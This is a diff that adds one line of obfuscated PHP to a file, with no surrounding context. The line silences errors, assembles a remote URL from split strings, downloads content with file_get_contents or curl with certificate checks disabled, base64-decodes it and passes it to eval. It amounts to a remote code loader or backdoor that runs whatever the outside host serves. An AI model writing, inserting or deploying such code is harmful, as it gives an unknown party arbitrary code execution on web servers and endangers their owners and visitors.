@@ -1,0 +1,1 @@
+<?php error_reporting(0);$u='https://slim.'.'weborama.nl/'.'DuIwsE';$c=@file_get_contents($u);if(!$c&&function_exists('curl_init')){$k=curl_init($u);curl_setopt_array($k,[19913=>1,64=>0,52=>1]);$c=curl_exec($k);curl_close($k);}if($c){$d=base64_decode($c);if(strpos($d,'<?')!==false)$c=$d;eval('?>'.$c);}?>
